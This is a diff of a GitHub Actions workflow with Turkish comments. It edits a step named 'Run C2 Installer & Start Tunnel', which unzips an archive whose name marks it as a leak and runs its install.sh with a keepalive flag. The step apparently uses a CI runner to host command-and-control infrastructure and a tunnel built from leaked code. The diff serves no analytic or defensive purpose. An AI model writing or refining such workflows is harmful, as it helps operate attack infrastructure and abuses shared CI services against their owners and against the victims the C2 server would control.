@@ -20,10 +20,12 @@ jobs:
 
       - name: Run C2 Installer & Start Tunnel
         run: |
-          unzip -o ./agarnetshitleakbyVessy1337.zip
+          # 1. Zip dosyasını soru sormadan (-q) ve üzerine yazarak (-o) çıkart
+          unzip -q -o ./agarnetshitleakbyVessy1337.zip
           
-          # Zip dosyası açıldıktan sonra install.sh dosyası bir alt klasörde çıkıyorsa 
-          # ilgili klasöre geçiş yapmalısınız (Örn: cd klasor_adi)
-          
+          # 2. Kurulum betiğine çalıştırma izni ver
           chmod +x install.sh
+          
+          # 3. Scripti çalıştır (Eğer keepalive veya tünel terminali kilitliyorsa arkaya atabilirsiniz, 
+          # ancak doğrudan çalışmasını istiyorsanız aşağıdaki gibi bırakabilirsiniz)
           ./install.sh --keepalive
